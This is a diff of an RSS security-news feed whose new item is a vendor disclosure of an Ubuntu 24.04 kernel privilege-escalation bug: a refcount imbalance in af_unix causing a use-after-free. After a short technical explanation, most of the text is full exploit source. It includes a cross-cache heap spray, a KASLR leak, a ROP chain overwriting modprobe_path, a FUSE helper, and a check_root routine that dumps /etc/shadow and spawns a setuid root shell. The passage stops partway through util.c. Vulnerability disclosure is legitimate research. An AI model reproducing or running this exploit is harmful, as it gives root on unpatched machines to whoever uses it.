@@ -1,4 +1,964 @@
-<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Cyber Security News</title><link>https://news.securehub.cc</link><description>Liveboat RSS Feed</description><item><title>Social Engineering People’s Credit Card Details</title><link>https://www.schneier.com/blog/archives/2025/10/social-engineering-peoples-credit-card-details.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Tue, 28 Oct 2025 11:01:20 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Your highway toll payment is now past due, one text warns. You have U.S. Postal Service fees to pay, another threatens. You owe the New York City Department of Finance for unpaid traffic violations.The texts are ploys to get unsuspecting victims to fork over their credit-card details. The gangs behind the scams take advantage of this information to buy iPhones, gift cards, clothing and cosmetics.Criminal organizations operating out of China, which investigators blame for the toll and postage messages, have used them to make more than $1 billion over the last three years, according to the Department of Homeland Security.Making the fraud possible: an ingenious trick allowing criminals to install stolen card numbers in Google and Apple Wallets in Asia, then share the cards with the people in the U.S. making purchases half a world away.]]></content:encoded></item><item><title>Brida (Burp-Frida Bridge) 0.6 released! - HN Security</title><link>https://hnsecurity.it/blog/brida-0-6-released/</link><author>/u/0xdea</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 10:35:05 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Recently, Ole André Vadla Ravnås (@oleavr) & co. made some breaking changes to their great Fridadynamic instrumentation toolkit, removing Java, ObjC, and Swift runtime bridges from Frida’s GumJS runtime and removing or refactoring many JS APIs used by most Frida-based tools (like Brida, our popular bridge between Burp Suite and Frida). Consequently, many functionalities of Brida broke and required some changes to work properly with the latest Frida versions. I just released a new version of Brida (0.6) that is fully compatible with the latest versions of Frida and frida-compile.As a downside, starting with version 0.6, Brida will not be compatible with older Frida versions (<17). Unfortunately, as anyone who has worked with Frida on physical Android or iOS devices likely knows, it often happens that a specific version of Frida doesn’t work on a particular device, and in such situations an older Frida version could be useful. For such scenarios, I will leave version 0.6pre of Brida available in the Releases section of the GitHub repository. This version works with frida-compile@10.2.5 and frida<17.Some highlights on the updates brought by the last Brida version: to reflect changes in frida >= 17 (17.3.2 at the time of the release).Fixed compatibility with the last frida-compile versions (19.0.4 at the time of the release). to work with the last Java versions.Added “Host:Port” and “DeviceId” Frida connection modes.Added JS bypass for OkHttpHostname Verified.Added Gradle build configuration file.Improved Android root detection script.Finally, some direct links:]]></content:encoded></item><item><title>Is Your Google Workspace as Secure as You Think it is?</title><link>https://thehackernews.com/2025/10/is-your-google-workspace-as-secure-as.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyefAwM_xLJ_3Su0-Eqr3MGmfs-wjuOGIjuyyR3Adh4daM2ho6_h6VZVGAVSON8AzQQbskUSrJuBavVYRyKBYFC6AhdHQRqgwpAhebsB179jetDhl-MJl8ZUuE-mSQbBYp4h0ewYpZC7-D5oxWVWTMWmU8Dqc2sK0Tt5_gvOySGgR7umpGc-yJZfWnQ8o/s1600/unnamed.png" length="" type=""/><pubDate>Tue, 28 Oct 2025 10:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The New Reality for Lean Security Teams
+<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Cyber Security News</title><link>https://news.securehub.cc</link><description>Liveboat RSS Feed</description><item><title>New Ubuntu Kernel LPE!</title><link>https://ssd-disclosure.com/lpe-via-refcount-imbalance-in-the-af_unix-of-ubuntus-kernel/</link><author>/u/SSDisclosure</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 11:44:40 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Ubuntu 24.04.2 with the kernel 6.8.0-60-genericThe vendor has released an updated kernel on the 18th of SeptemberThe vulnerability was disclosed during our TyphoonPWN 2025 Linux category and won first place.The vulnerability is caused by a refcount imbalance issue in the af_unix subsystem of Ubuntu’s kernel.The af_unix subsystem allows users to send fds across processes.To address issues caused by circular references in the situation where the fd we send is the socket itself, this subsystem comes up with a garbage collection mechanism.The specific algorithm used in the garbage collection is not relevant for this bug, so I’m not going to talk about it here, interested readers can refer to this projectzero blog (https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html).Recently, through a series of patches, Linux replaced its garbage collection algorith (https://github.com/gregkh/linux/commit/4090fa373f0e763c43610853d2774b5979915959).On top of the new gc, a new change is introduced to af_unix (https://github.com/gregkh/linux/commit/f0f170d7b7ed9b824e8f2502dfba4ee1eb76dac4), which is to make  do no hold a skb reference. is a out of band skb that can be created by  with the  flag. It used to hold a reference to the skb but this refcounting led to a lot of bugs in the past.Therefore this patch is to make sure  no longer holds a refcount, making it just a pointer.Notice that this change involves changing two files:  and , the most relevant changes are as follows:(1) make sure the  function in  does not give  a refcount (delete )(2) make sure the  function in  does not decrease the refcount (delete )Ubuntu 24.04’s kernel, which is based on (on 6.8.12), uses the old GC algorithm. Thus, the change to  does not apply (the upstream patch is for the new GC algorithm).But somehow Ubuntu still went with it and applied the change to , which is to remove the  line.The old GC algorithm also decrease ‘s reference in , just use a different function call ().As a result, Ubuntu’s incorrect change to  caused a refcount inbalance, leading to UAF of a  object, which in a dedicated cache (“skbuff_head_cache”) and each object is of size 0x100.The relevant code is listed as follows:static int queue_oob(struct socket *sock, struct msghdr *msg, struct sock *other,
+             struct scm_cookie *scm, bool fds_sent)
+{
+    ...
+    skb = sock_alloc_send_skb(sock->sk, 1, msg->msg_flags & MSG_DONTWAIT, &err);
+    ...
+    skb_put(skb, 1);
+    skb_get(skb); <--- this is what Ubuntu removes
+    ...
+    WRITE_ONCE(ousk->oob_skb, skb);
+    ...
+}
+
+void unix_gc(void)
+{
+    ...
+    list_for_each_entry(u, &gc_candidates, link) {
+        ...
+        if (u->oob_skb) {
+            kfree_skb(u->oob_skb);
+            u->oob_skb = NULL;
+        }
+    }
+    ...
+}
+
+static void unix_release_sock(struct sock *sk, int embrion)
+{
+    ...
+    while ((skb = skb_dequeue(&sk->sk_receive_queue)) != NULL) {
+        ...
+        kfree_skb(skb);
+    }
+    ...
+}As we can see in the code above, previously, the  has two references.When we close the sockets, one refcount will be decreased by the  and the other gets decreased by  which is the handler of .Now that Ubuntu removes the  line in , in theory, we can trigger UAF in either  or .But in practice, the object is always freed by  and the UAF use always happens in .Notice that both  and  can happen after we close the af_unix socket.We need a way to separate the invocation of these two functions so that we can do our exploitation, which usually takes some time.My approach is to force GC right after closing the af_unix socket by sending another af_unix packet.static int unix_dgram_sendmsg(...)
+{
+    ...
+    wait_for_unix_gc();
+    ...
+    err = skb_copy_datagram_from_iter(skb, 0, &msg->msg_iter, len);
+    ...
+}
+
+#define UNIX_INFLIGHT_TRIGGER_GC 16000
+void wait_for_unix_gc(void)
+{
+    if (READ_ONCE(unix_tot_inflight) > UNIX_INFLIGHT_TRIGGER_GC && !READ_ONCE(gc_in_progress))
+        unix_gc();
+    ...
+}As we can see above, if we have a huge , we can trigger  when doing sendmsg. means the total number of af_unix sockets that are being sent by af_unix sockets, which can be easily done by users of any privilege level.As a result, we can deterministically invoke . is a callback function for , whose invocation cannot be controlled through syscalls.But interestingly, it is marked as a TWA_RESUME work, which is a work to do right after finishing a syscall and right before returning back to userspace (see ).In our case, after , the last reference to the socket will be gone, so  will be scheduled right after the triggering  syscall.In other words, we need to perform all the heap-related stuff within the  syscall, which is almost impossible.But luckily, there is a skb_copy_datagram_from_iter function after  and before the invocation of . This function invokes  internally, which gives us a chance to halt the execution of the syscall.There are a few ways to achieve this. I chose the easiest approach, which is to use FUSE.Specifically, we can  an address that is backed by a FUSE filesystem and pass this address to skb_copy_datagram_from_iter.When the  hits, it will realize that although this address is mapped, the content is not there yet.So it will invoke our  handler to retrieve the data.We make  sleep for a few seconds, delaying the execution.As a result, we can deterministically trigger  to free the object, halt the syscall through FUSE, and then finally invoke  to use the freed object when the syscall finishes.Since our vulnerable object is in a dedicated cache (“skbuff_head_cache”), we will have to resolve to the cross-cache attack.Essentially, we free all objects in the cache so that the page used by the slab is returned back to the page allocator.Then we can reclaim the page with data we control.Here, I chose to reclaim the page with  because it is the easiest to implement and we control the number of pages.As a result, we are able to overwrite the vulnerable object with data we control.Now let’s see what we can do with the overwrite.Essentially, the kernel will invoke  (through ) where the content of `skb is in our control.Digging into it, we can see this codevoid skb_release_head_state(struct sk_buff *skb)
+{
+    ...
+    if (skb->destructor) {
+        DEBUG_NET_WARN_ON_ONCE(in_hardirq());
+        skb->destructor(skb);
+    }
+    ...
+}So, we will have RIP control and rdi pointing to what we control.But, we need KASLR leak.We can easily bypas KASLR using prefetch attack these days.Entrybleed is the most famous prefetch attack variant.But since modern computers no longer has KPTI on anymore, we can directly prefetch the kernel space and probe where the kernel is.With statistical analysis and a major vote algorithm, my exploit can bypass KALSR with 100% successs rate.Finally, with KASLR bypassed and RIP/rdi control, we can easily ROP to overwrite modprobe_path and escalate to root.Since 2007,  has been helping security researchers turn their findings into thriving careers.Explore our  – updated monthly with new products and vendors.// poc.c
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdint.h>
+#include <stdarg.h>
+#include <pthread.h>
+#include <assert.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <sched.h>
+#include <arpa/inet.h>
+#include <sys/syscall.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/prctl.h>
+#include <sys/mman.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <net/if.h>
+#include <linux/sockios.h>
+#include <sys/resource.h>
+
+typedef unsigned long long u64;
+typedef unsigned int u32;
+
+extern u64 cpu_num;
+void set_cpu(int cpuid);
+int pg_vec_spray(void *src_buf, u32 buf_size, u32 num);
+void setup_pg_vec();
+pid_t clean_fork(void);
+u64 entrybleed_get_kaslr_slide_nopti();
+
+#define SPRAY_NUM_1 0x200
+#define SPRAY_NUM_2 0x40
+#define SPRAY_NUM_3 0x40
+#define FORK_NUM 10
+#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))
+int spray_sock1[SPRAY_NUM_1/0x10];
+int spray_sock2[SPRAY_NUM_2/0x10];
+int spray_sock3[SPRAY_NUM_3/0x10];
+char payload[0x2000];
+u64 pg_vec_spray_size = 0x2000;
+u64 kaslr_slide = 0;
+
+char path[0x800];
+
+int socks[2];
+int socks2[2];
+int pid = -1;
+void *fuse_addr;
+
+int *stage;
+int *status_ptr;
+
+void wait_for_all_status(int status);
+
+void payload_setup()
+{
+	int fd = open("/tmp/exp/lol", O_RDWR);
+	assert(fd >= 0);
+	fuse_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+	assert((long long)fuse_addr >= 0);
+
+	memset(payload, 'B', sizeof(payload));
+	for(int i=0; i<pg_vec_spray_size/0x100; i++) {
+		void *obj = (void *)(payload + i*0x100);
+		*(int *)(obj + 0x9e + 4) = 1;
+		*(int *)(obj + 0x9e - 4) = 1;
+		*(u64*)(obj + 0x9e - 4 - 0x7c - 8) = 0;
+		*(u64*)(obj + 0x9e - 4 - 0x7c) = kaslr_slide + 0xffffffff8196a4d5; // : mov rax, qword ptr [rbx + 0x18] ; mov rsi, rbx ; call rax
+
+		// unlink
+		*(u64*)(obj + 0xbe) = kaslr_slide + 0xffffffff8438c000;
+		*(u64*)(obj + 0xbe +8) = kaslr_slide + 0xffffffff8438c000;
+
+		// pivot
+		void *ptr = obj + 0xbe;
+		*(u64*)(ptr + 0x18) = kaslr_slide + 0xffffffff81b146da; // : push rdi ; jmp qword ptr [rsi + 0x39]
+		*(u64*)(ptr + 0x39) = kaslr_slide + 0xffffffff8223e7da; // : pop rsp; pop rbx; pop rbp; ret;
+
+		// ROP chain
+		*(u64*)(ptr + 0x10) = kaslr_slide + 0xffffffff81852574; //: add rsp, 0x48; pop rbp; ret
+		*(u64*)(ptr + 0x68) = kaslr_slide + 0xffffffff810f1ce0; //: pop rsi; pop rdi; pop rbx; ret
+		*(u64*)(ptr + 0x70) = kaslr_slide + 0xffffffff837de280-0x10; // modprobe_path
+		*(u64*)(ptr + 0x78) = 0x782f706d742f; // /tmp/x
+		*(u64*)(ptr + 0x80) = 0;
+		*(u64*)(ptr + 0x88) = kaslr_slide + 0xffffffff81cdf1d9; // : mov qword ptr [rsi + 0x10], rdi ; xor esi, esi ; xor edi, edi ; ret
+		*(u64*)(ptr + 0x90) = kaslr_slide + 0xffffffff82252e95; //: pop rdi; ret;
+		*(u64*)(ptr + 0x98) = 0x7fffffff;
+		*(u64*)(ptr + 0xa0) = kaslr_slide + 0xffffffff81209f20; // msleep
+	}
+}
+
+void trigger_gc()
+{
+	send(socks2[0], fuse_addr, 1, 0);
+}
+
+void skb_spray_1()
+{
+	char buf[0x40];
+	memset(buf, 'A', sizeof(buf));
+	int i = 0;
+	int num = SPRAY_NUM_1;
+	int socks[2];
+
+	while(num) {
+		int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
+		assert(ret == 0);
+
+		int todo = 0x10;
+		if (num < 0x10) todo = num;
+		for(int i=0; i<todo; i++) {
+			send(socks[0], buf, sizeof(buf), 0);
+		}
+		num -= todo;
+		spray_sock1[i++] = socks[1];
+	}
+}
+
+void skb_spray_2()
+{
+	char buf[0x40];
+	memset(buf, 'A', sizeof(buf));
+	int i = 0;
+	int num = SPRAY_NUM_2;
+	int socks[2];
+
+	while(num) {
+		int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
+		assert(ret == 0);
+
+		int todo = 0x10;
+		if (num < 0x10) todo = num;
+		for(int i=0; i<todo; i++) {
+			send(socks[0], buf, sizeof(buf), 0);
+		}
+		num -= todo;
+		spray_sock2[i++] = socks[1];
+	}
+}
+
+void skb_spray_3()
+{
+	char buf[0x40];
+	memset(buf, 'A', sizeof(buf));
+	int i = 0;
+	int num = SPRAY_NUM_3;
+	int socks[2];
+
+	while(num) {
+		int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
+		assert(ret == 0);
+
+		int todo = 0x10;
+		if (num < 0x10) todo = num;
+		for(int i=0; i<todo; i++) {
+			send(socks[0], buf, sizeof(buf), 0);
+		}
+		num -= todo;
+		spray_sock3[i++] = socks[1];
+	}
+}
+
+void skb_release_1()
+{
+	char buf[0x100];
+	for(int i=0; i<SPRAY_NUM_1/0x10; i++) {
+		recv(spray_sock1[i], buf, 0x100, 0);
+	}
+}
+
+void skb_release_2()
+{
+	char buf[0x100];
+	for(int i=0; i<SPRAY_NUM_2/0x10; i++) {
+		for(int j=0; j<0x10; j++)
+			recv(spray_sock2[i], buf, 0x100, 0);
+	}
+}
+
+void skb_release_3()
+{
+	char buf[0x100];
+	for(int i=0; i<SPRAY_NUM_3/0x10; i++) {
+		for(int j=0; j<0x10; j++)
+			recv(spray_sock3[i], buf, 0x100, 0);
+	}
+}
+
+int val = 0;
+int *ptr = &val;
+void *gc_func(void *arg)
+{
+	set_cpu(1);
+
+	close(socks[1]);
+	close(socks[0]);
+
+	*ptr = 1;
+	trigger_gc();
+	sleep(10000);
+}
+
+void exploit(void)
+{
+	mmap((void*)0x20000000, 0x1000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
+
+	int ret = socketpair(AF_UNIX, SOCK_STREAM, 0, socks);
+	assert(ret == 0);
+
+	ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks2);
+	assert(ret == 0);
+
+	char ubuf[] = "AA";
+	struct iovec vec = {
+		.iov_base = ubuf,
+		.iov_len = 2,
+	};
+
+	struct msghdr msghdr = {
+		.msg_name = NULL,
+		.msg_namelen = 0,
+		.msg_iov = &vec,
+		.msg_iovlen = 1,
+		.msg_control = (void*)0x20000340,
+		.msg_controllen = 0x38,
+		.msg_flags = 0,
+	};
+
+	*(uint64_t*)0x20000340 = 0x1c;
+	*(uint32_t*)0x20000348 = SOL_SOCKET;
+	*(uint32_t*)0x2000034c = SCM_CREDENTIALS;
+	*(uint32_t*)0x20000350 = getpid();
+	*(uint32_t*)0x20000354 = 0;
+	*(uint32_t*)0x20000358 = 0;
+
+	*(uint64_t*)0x20000360 = 0x14;
+	*(uint32_t*)0x20000368 = SOL_SOCKET;
+	*(uint32_t*)0x2000036c = SCM_RIGHTS;
+	*(uint32_t*)0x20000370 = socks[0];
+
+	skb_spray_1();
+
+	// make sure the victim skb is in a controlled page
+	skb_spray_2();
+	sendmsg(socks[1], &msghdr, MSG_OOB);
+	skb_spray_3();
+
+	// force the target slab to be in cpu_partial
+	skb_release_2();
+	skb_release_3();
+
+	// flush cpu_partial
+	skb_release_1();
+	sleep(1);
+
+	// trigger the free in another thread and delay the trigger using FUSE
+	pthread_t tid = 0;
+	ret = pthread_create(&tid, NULL, gc_func, NULL);
+	assert(ret == 0 );
+	while(*ptr != 1);
+
+	// now spray pages using multiple processes
+	*stage = 1;
+	pg_vec_spray(payload, pg_vec_spray_size, 0x200);
+	wait_for_all_status(1);
+
+	// now sleep forever and wait for the payload to get triggered
+	puts("[*] wait for the payload to get triggered");
+	while(1);sleep(1000000);
+}
+
+void increase_inflight(int num)
+{
+	int socks[2];
+	int socks2[2];
+	int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
+	assert(ret == 0);
+
+	ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks2);
+	assert(ret == 0);
+
+	char ubuf[] = "A";
+	struct iovec vec = {
+		.iov_base = ubuf,
+		.iov_len = 1,
+	};
+
+	int buf_size = CMSG_ALIGN(0x10+num*sizeof(int));
+	void *buf = malloc(buf_size);
+	memset(buf, 0, buf_size);
+
+	struct msghdr msghdr = {
+		.msg_name = NULL,
+		.msg_namelen = 0,
+		.msg_iov = &vec,
+		.msg_iovlen = 1,
+		.msg_control = buf,
+		.msg_controllen = buf_size,
+		.msg_flags = 0,
+	};
+
+	struct cmsghdr *cmsghdr = (struct cmsghdr *)buf;
+	cmsghdr->cmsg_len = 0x10+num*sizeof(int);
+	cmsghdr->cmsg_level = SOL_SOCKET;
+	cmsghdr->cmsg_type = SCM_RIGHTS;
+	int *fd_array = (int *)(buf + sizeof(struct cmsghdr));
+	for(int i=0; i<num; i++) {
+		fd_array[i] = socks2[0];
+	}
+
+	ret = sendmsg(socks[1], &msghdr, 0);
+	assert(ret >= 0);
+}
+
+void prepare_force_gc()
+{
+	for(int i=0; i<16; i++) {
+		if(!clean_fork()) {
+			for(int j=0; j<5; j++) {
+				increase_inflight(200);
+			}
+			sleep(100000);
+		}
+	}
+	sleep(1);
+}
+
+void spray_func(int idx)
+{
+	while(*stage == 0);
+	pg_vec_spray(payload, pg_vec_spray_size, 0x200);
+	status_ptr[idx] = 1;
+
+	sleep(10000);
+	// while(1);
+}
+
+void setup_context(void)
+{
+	// depending on the number of CPU, our target slab will have different number of pages
+	if (cpu_num > 4) {
+		pg_vec_spray_size = 0x2000;
+	} else {
+		pg_vec_spray_size = 0x1000;
+	}
+	printf("[*] pg_vec_spray_size: %#llx\n", pg_vec_spray_size);
+
+	stage = (int *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0);
+	assert((long)stage != -1);
+	*stage = 0;
+	status_ptr = stage + 1;
+
+	for(int i=0; i<FORK_NUM; i++) {
+		if(!clean_fork()){
+			spray_func(i);
+			exit(0);
+		}
+	}
+}
+
+void wait_for_all_status(int status)
+{
+	int done = 0;
+	while(1) {
+		for(int i=0; i<FORK_NUM; i++) {
+			if(status_ptr[i] != status) continue;
+			if(i == FORK_NUM-1) return;
+		}
+	}
+}
+
+void increase_limit()
+{
+    int ret;
+    struct rlimit open_file_limit;
+
+    /* Query current soft/hard value */
+    ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
+    assert(ret >= 0);
+
+    /* Set soft limit to hard limit */
+    open_file_limit.rlim_cur = open_file_limit.rlim_max;
+    ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
+    assert(ret >= 0);
+}
+
+void attempt()
+{
+	char *buf = getenv("SLIDE");
+	kaslr_slide = (u64)atoll(buf);
+	printf("[*] exploit attempt with kaslr_slide: %#llx\n", kaslr_slide);
+	increase_limit();
+	setup_pg_vec();
+	payload_setup();
+	setup_context();
+
+	exploit();
+}
+
+int modprobe_overwritten() {
+	int fd = open("/proc/sys/kernel/modprobe", 0);
+	char buf[0x2000];
+	memset(buf, 0, sizeof(buf));
+	read(fd, buf, sizeof(buf));
+	return !strncmp(buf, "/tmp/x", 6);
+}
+
+void check_root() {
+	// if we are root
+	if (open("/etc/shadow", 0) >= 0) {
+		setuid(0);
+		setgid(0);
+		puts("============================");
+		puts("|   Pwned by @ky1ebot !    |");
+		puts("============================");
+		system("id;");
+		puts("============================");
+		system("head -n 10 /etc/shadow");
+		puts("============================");
+		system("/bin/bash");
+		exit(0);
+	}
+	// or if we can be root
+	int tmp_fd = open("/proc/sys/kernel/modprobe", 0);
+	char buf[0x2000];
+	memset(buf, 0, sizeof(buf));
+	read(tmp_fd, buf, sizeof(buf));
+	if (!strncmp(buf, "/tmp/x", 6)) {
+		sprintf(buf, "echo '#!/bin/bash\\nchown root:root %s; chmod 04755 %s' > /tmp/x; chmod +x /tmp/x", path, path);
+		system(buf);
+		system("echo 1 > /tmp/1; chmod +x /tmp/1; /tmp/1 2> /dev/null");
+		char * argv[] = {
+			path,
+			NULL
+		};
+		char * env[] = {
+			NULL
+		};
+		execve(path, argv, env);
+	}
+}
+
+int main(int argc, char ** argv, char ** env)
+{
+	// save absolute path for later use
+	if (argc && argv[0] && argv[0][0]) assert(realpath(argv[0], path) != NULL);
+
+	// in case we already are/can be root
+	check_root();
+
+	// if this is an exploit process
+	if (getenv("SLIDE")) {
+		puts("[*] attempt!");
+		attempt();
+		exit(0);
+	}
+
+	// launch fuse
+	system("mkdir -p /tmp/exp && ./fusefs /tmp/exp");
+
+	// prepare
+	increase_limit();
+	prepare_force_gc();
+
+	// launch exploit process
+	char *cmd = NULL;
+	int ret = asprintf(&cmd, "busybox sh -c 'unshare -rn %s'", path);
+	assert(ret >= 0);
+	puts(cmd);
+	while(1) {
+		// leak kaslr
+		kaslr_slide = entrybleed_get_kaslr_slide_nopti();
+		if (kaslr_slide == -1) {
+			puts("[-] fail to leak kaslr_slide");
+			continue;
+		}
+		printf("[+] kaslr_slide: %#llx\n", kaslr_slide);
+
+		// pass it to the exploit process
+		char *buf = NULL;
+		ret = asprintf(&buf, "%lld", kaslr_slide);
+		assert(ret >= 0);
+		setenv("SLIDE", buf, 1);
+
+		if(!clean_fork()) {
+			system(cmd);
+			sleep(10000);
+		}
+
+		// give each exploit 6 seconds to run
+		int good = 0;
+		for(int i=0; i<6; i++) {
+			if (modprobe_overwritten()) {
+				good = 1;
+				break;
+			}
+			sleep(1);
+		}
+
+		// check whether we succeed or not
+		if (good) {
+			puts("[+] successfully overwrite modprobe_path");
+			break;
+		} else {
+			puts("[-] failed to overwrite modprobe_path");
+		}
+	}
+
+	check_root();
+	while(1) sleep(100000);
+	return 0;
+}// FUSE: Filesystem in USErspace
+// fusefs.c - FUSE filesystem handler
+// Made by @LukeGix
+
+#define FUSE_USE_VERSION 26
+
+#include <fuse.h>
+#include <stdio.h>
+#include <string.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <err.h>
+#include <sys/uio.h>
+#include <assert.h>
+#include <stdlib.h>
+
+#define FILE_TARGET "/lol"
+
+unsigned int file_size = 0x10;
+
+char file_buffer[4096];
+int len = 10;
+static int FUSE_getattr(const char *path, struct stat *stbuf){
+	int res = 0;
+	memset(stbuf, 0, sizeof(struct stat));
+	if (strcmp(path, "/") == 0) {
+		stbuf->st_mode = S_IFDIR | 0755;
+		stbuf->st_nlink = 2;
+	} else if (strcmp(path, FILE_TARGET) == 0) {
+		stbuf->st_mode = S_IFREG | 0666;
+		stbuf->st_nlink = 1;
+		stbuf->st_size = file_size;
+		stbuf->st_blocks = 0;
+	}
+	else {
+		res = -ENOENT;
+	}
+	return res;
+}
+
+// It defines the result of, for example, `ls`
+static int FUSE_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {
+	filler(buf, ".", NULL, 0);
+	filler(buf, "..", NULL, 0);
+	filler(buf, "lol", NULL, 0);
+	return 0;
+}
+
+static int FUSE_open(const char *path, struct fuse_file_info *fi) {
+	return 0;
+}
+
+static int FUSE_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi){
+	if(strcmp(path, FILE_TARGET) == 0){
+		//for(;;){
+		//	printf("[+] Pausing kernel thread...\n");
+		//	sleep(200);
+		//}
+		printf("[+] Pausing kernel thread for 5s\n");
+		sleep(2);
+		memcpy(buf, file_buffer, size);
+	}
+
+	return size;
+}
+
+
+static int FUSE_write(const char *path, const char *buf_to_write, size_t size, off_t offset, struct fuse_file_info *fi ){
+	if(strcmp(path, FILE_TARGET) == 0){
+		assert(offset <= 4096 && (file_size + size) <= 4096);
+		//Write in no-append mode
+		if(offset == 0){
+			memset(file_buffer, 0,4096);
+			file_size = 0;
+		}
+		memcpy(file_buffer+offset, buf_to_write, size);
+		file_size += size;
+	}
+	return size;
+}
+
+// Just random stubs
+static int FUSE_setxattr(const char *a, const char *b, const char *c, size_t d, int e){
+	return 0;
+}
+
+static int FUSE_truncate(const char *a, off_t b, struct fuse_file_info *fi){
+		return 0;
+}
+
+static int FUSE_chmod(const char *, mode_t, struct fuse_file_info *fi){
+		return 0;
+}
+
+static int FUSE_chown(const char *, uid_t, gid_t, struct fuse_file_info *fi){
+		return 0;
+}
+
+static int FUSE_utimens(const char *, const struct timespec tv[2], struct fuse_file_info *fi){
+		return 0;
+}
+
+
+static struct fuse_operations FUSE_ops = {
+	.getattr	= FUSE_getattr,
+	.readdir	= FUSE_readdir,
+	.open	   = FUSE_open,
+	.read	   = FUSE_read,
+	.write 	= FUSE_write,
+	.setxattr 	= FUSE_setxattr,
+	.truncate 	= FUSE_truncate,
+	.chmod 	= FUSE_chmod,
+	.chown 	= FUSE_chown,
+	.utimens 	= FUSE_utimens
+};
+
+int main(int argc, char *argv[]) {
+	//Initialization of the filesystem
+	memset(file_buffer, 'A', sizeof(file_buffer));
+	return fuse_main(argc, argv, &FUSE_ops, NULL);
+}// util.c
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdarg.h>
+#include <signal.h>
+#include <sched.h>
+#include <time.h>
+#include <math.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <arpa/inet.h>
+#include <net/if.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <linux/sockios.h>
+#include <sys/prctl.h>
+#include <sys/ioctl.h>
+
+typedef unsigned int u32;
+typedef unsigned long long u64;
+
+u64 cpu_num;
+
+void error_out(const char *fmt, ...)
+{
+    char *buf;
+    va_list ap;
+
+    va_start(ap, fmt);
+    if(vasprintf(&buf, fmt, ap) < 0) {
+        perror("[error_out]");
+        exit(-1);
+    }
+    va_end(ap);
+    
+    puts(buf);
+    perror("[Reason] ");
+    exit(-1);
+}
+
+pid_t clean_fork(void)
+{
+    pid_t pid = fork();
+    if(pid) return pid; 
+
+    if(prctl(PR_SET_PDEATHSIG, SIGKILL) < 0) error_out("fail to register DEATHSIG");
+    return pid; 
+}
+
+void set_cpu(int cpuid)
+{
+    cpu_set_t my_set;
+    CPU_ZERO(&my_set);
+    CPU_SET(cpuid, &my_set);
+    if(sched_setaffinity(0, sizeof(my_set), &my_set) != 0)
+        error_out("set cpu affinity at cpu: %d fails", cpuid);
+}
+
+int pg_vec_spray(void *src_buf, u32 buf_size, u32 num)
+{
+    if((buf_size & 0xfff) != 0) error_out("[pg_vec_spray] buf_size");
+
+    // remember to run everything in sandbox
+    int s = socket(AF_PACKET, SOCK_RAW|SOCK_CLOEXEC, htons(ETH_P_ALL));
+    if(s < 0) error_out("[pg_vec_spray] socket");
+
+    struct tpacket_req req;
+    req.tp_block_size = buf_size;
+    req.tp_block_nr = num;// spray times
+    req.tp_frame_size = buf_size;
+    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
+    int ret = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
+    if(ret < 0) error_out("[pg_vec_spray] setsockopt");
+
+    struct sockaddr_ll sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.sll_family = PF_PACKET;
+    sa.sll_protocol = htons(ETH_P_ARP);
+    sa.sll_ifindex = if_nametoindex("lo");
+    sa.sll_hatype = 0;
+    sa.sll_pkttype = 0;
+    sa.sll_halen = 0;
+
+    memset(&sa, 0, sizeof(sa));
+    sa.sll_ifindex = if_nametoindex("lo");
+    sa.sll_halen = ETH_ALEN;
+    void *addr = mmap(NULL, buf_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON|MAP_POPULATE, -1, 0);
+    memcpy(addr, src_buf, buf_size);
+    for(int i=0; i<num; i++) {
+        ret = sendto(s, addr, buf_size, 0, (struct sockaddr *)&sa, sizeof(sa));
+        if(ret < 0) error_out("[pg_vec_spray] sendto");
+    }
+    return s;
+}
+
+void setup_pg_vec()
+{
+    // bring up lo interface
+    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+    struct ifreq req;
+    memset(&req, 0, sizeof(req));
+    strcpy(req.ifr_name, "lo");
